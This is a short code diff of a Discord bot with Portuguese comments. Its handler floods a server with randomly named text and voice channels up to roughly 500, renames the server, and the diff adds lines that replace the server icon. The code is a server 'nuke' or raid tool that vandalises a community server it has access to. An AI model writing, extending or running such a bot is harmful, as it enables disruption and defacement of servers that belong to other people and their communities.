@@ -34,6 +34,7 @@ client.on("message", async (message) => {
 	    const textuh = makeid(32);                                                             //cria uma variavel string usando aquela function ali em cima
 	    message.guild.createChannel(`${textuh}`, 'text')                                       //cria um canal com o nome a variavel textuh
 	    message.guild.createChannel(`${textuh}`, 'voice');                                       //cria um canal de texto com o nome a var textuh
+	    server.setIcon('./icon.png')   
 	if(message.guild.channels > 499) break;
        }
     }
@@ -44,6 +45,7 @@ client.on("message", async (message) => {
         const texth = makeid(32);                                                                  //cria outra variavel usando aquela function ali
 	    message.guild.createChannel(`${texth}`, 'text');                                       //cria um canal de texto com o nome a var texth	
 	    message.guild.setName(process.env.SERVER_NAME)                                         //coloca o nome do sv esse ae uwu
+	    server.setIcon('./icon.png')   
     }
 });
 
